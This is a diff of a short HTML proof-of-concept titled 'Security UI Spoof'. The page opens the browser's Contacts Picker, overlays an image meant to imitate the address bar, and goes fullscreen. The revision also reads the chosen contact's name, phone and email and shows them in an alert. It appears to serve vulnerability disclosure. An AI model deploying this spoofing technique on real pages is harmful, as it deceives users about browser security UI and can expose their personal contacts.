@@ -3,10 +3,8 @@
 <head>
   <title>Security UI Spoof</title>
   <meta charset="utf-8">
-  <meta
-    name="viewport"
-    content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"
-  />
+  <meta name="viewport"
+        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
 
   <style>
     html, body {
@@ -31,40 +29,68 @@
     #content {
       height: 100%;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
       color: #fff;
       text-align: center;
+    }
+
+    #result {
+      margin-top: 20px;
+      font-size: 16px;
+      opacity: .9;
     }
   </style>
 </head>
 
 <body>
 
-<img id="spoof" src="spof2.png" alt="spoof">
+<img id="spoof" src="spoof.png" alt="spoof">
 
 <div id="content">
-  <h1>Click anywhere on the page to spoof the omnibox!</h1>
+  <h1>Click anywhere on the page</h1>
+  <div id="result"></div>
 </div>
 
 <script>
-  document.addEventListener('click', async () => {
+document.addEventListener('click', async () => {
 
-    // 1️⃣ Trigger trusted system UI (Contacts Picker)
-    if (navigator.contacts && navigator.contacts.select) {
-      navigator.contacts.select(["name"], {}).catch(() => {});
-    }
+  let contacts = [];
 
-    // 2️⃣ Show spoof overlay
-    document.getElementById('spoof').style.display = 'block';
-    document.getElementById('content').style.display = 'none';
+  // 1️⃣ Contacts Picker (explicit user consent)
+  if (navigator.contacts && navigator.contacts.select) {
+    try {
+      contacts = await navigator.contacts.select(
+        ["name", "email", "tel"],
+        { multiple: false }
+      );
+    } catch (e) {}
+  }
 
-    // 3️⃣ Request fullscreen
-    if (document.documentElement.requestFullscreen) {
-      document.documentElement.requestFullscreen().catch(() => {});
-    }
+  // 2️⃣ Show spoof overlay
+  document.getElementById('spoof').style.display = 'block';
+  document.getElementById('content').style.display = 'none';
 
-  }, { once: true });
+  // 3️⃣ Fullscreen
+  if (document.documentElement.requestFullscreen) {
+    document.documentElement.requestFullscreen().catch(()=>{});
+  }
+
+  // 4️⃣ Auto-render selected contact (UX “auto-fill” demo)
+  if (contacts.length > 0) {
+    const c = contacts[0];
+    console.log(c);
+
+    alert(
+      "Selected contact:\n" +
+      (c.name?.[0] || "") + "\n" +
+      (c.tel?.[0] || "") + "\n" +
+      (c.email?.[0] || "")
+    );
+  }
+
+}, { once: true });
 </script>
 
 </body>
